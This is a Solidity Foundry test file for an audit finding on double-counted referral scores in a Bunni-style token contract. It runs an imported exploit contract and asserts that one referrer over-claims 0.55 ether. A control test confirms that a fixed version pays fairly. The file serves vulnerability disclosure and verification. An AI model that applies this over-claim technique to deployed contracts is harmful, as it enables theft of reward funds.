// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit, RewardToken, BunniTokenFixed, Depositor} from
    "./43545-c-06-double-counting-of-referral-scores-leading-to-over-clai.sol";

contract Finding43545Test is Test {
    function test_exploit_referrer2_claims_moved_score_twice() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.taken(), 1.05 ether, "referrer2 took 1.05");
        assertEq(e.reward().balanceOf(address(e)), 1.05 ether, "exploit holds 1.05");
        assertEq(e.bunni().scoreOf(1), 0, "referrer1 score moved");
        assertEq(e.bunni().scoreOf(2), 2.1 ether, "referrer2 holds both scores");
        assertEq(e.taken() - e.fair(), 0.55 ether, "0.55 ether double-counted");
    }

    function test_control_settle_before_score_move_pays_half() public {
        RewardToken reward = new RewardToken();
        BunniTokenFixed bunni = new BunniTokenFixed(reward);
        Depositor depositor = new Depositor();
        address sink = address(new Depositor());
        bunni.setReferrerAddress(1, sink);
        bunni.setReferrerAddress(2, address(this));
        reward.mint(address(this), 1 ether);
        reward.approve(address(bunni), type(uint256).max);

        bunni.mint(address(this), 1 ether, 1);
        depositor.mint(address(bunni), address(depositor), 1 ether, 2);
        bunni.distributeReferralRewards(1 ether);
        uint256 first = bunni.claimReferralRewards(1);
        bunni.mint(address(this), 0.1 ether, 2);
        uint256 second = bunni.claimReferralRewards(2);

        assertEq(first, 0.5 ether, "referrer1 still 0.5");
        assertEq(second, 0.5 ether, "referrer2 stays at 0.5");
        assertEq(reward.balanceOf(address(this)), 0.5 ether, "no double pay");
    }
}
